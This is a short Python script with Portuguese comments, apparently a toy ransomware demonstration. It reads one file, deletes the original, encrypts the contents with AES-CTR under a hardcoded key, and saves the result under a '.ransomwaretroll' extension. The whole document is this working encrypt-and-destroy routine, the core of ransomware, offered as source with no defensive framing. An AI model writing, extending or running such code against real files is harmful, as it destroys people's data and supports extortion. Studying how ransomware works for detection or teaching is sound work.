import os
import pyaes

# Nome do arquivo a ser criptografado
input_file_name = "teste.txt"

# Abrir o arquivo a ser criptografado usando o bloco with
with open(input_file_name, "rb") as input_file:
    file_data = input_file.read()

# Remover o arquivo original
os.remove(input_file_name)

# Chave de criptografia (mantenha sua chave segura e não a compartilhe)
encryption_key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(encryption_key)

# Criptografar o arquivo
encrypted_data = aes.encrypt(file_data)

# Nome do novo arquivo criptografado
output_file_name = input_file_name + ".ransomwaretroll"

# Salvar o arquivo criptografado usando o bloco with
with open(output_file_name, 'wb') as output_file:
    output_file.write(encrypted_data)
